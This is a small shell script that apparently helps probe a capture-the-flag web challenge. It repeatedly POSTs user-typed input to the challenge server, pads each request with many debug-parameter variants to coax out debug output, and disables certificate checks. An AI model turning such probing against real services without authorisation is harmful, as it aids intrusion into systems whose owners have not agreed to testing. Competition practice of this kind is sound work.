#!/bin/sh

while true;do
 echo -n "$ "; read password
 
  curl -k 'https://cyberyoddha.baycyber.net:33004/?debug=true&dbg=true&_debug_=true&__debug__=true&debug=1&dbg=1&_debug_=1&__debug__=1' --data "debug=1&dbg=1&_debug_=1&__debug__=1&debug=true&dbg=true&_debug_=true&__debug__=true&Form_input=${password}"
  echo ""
done

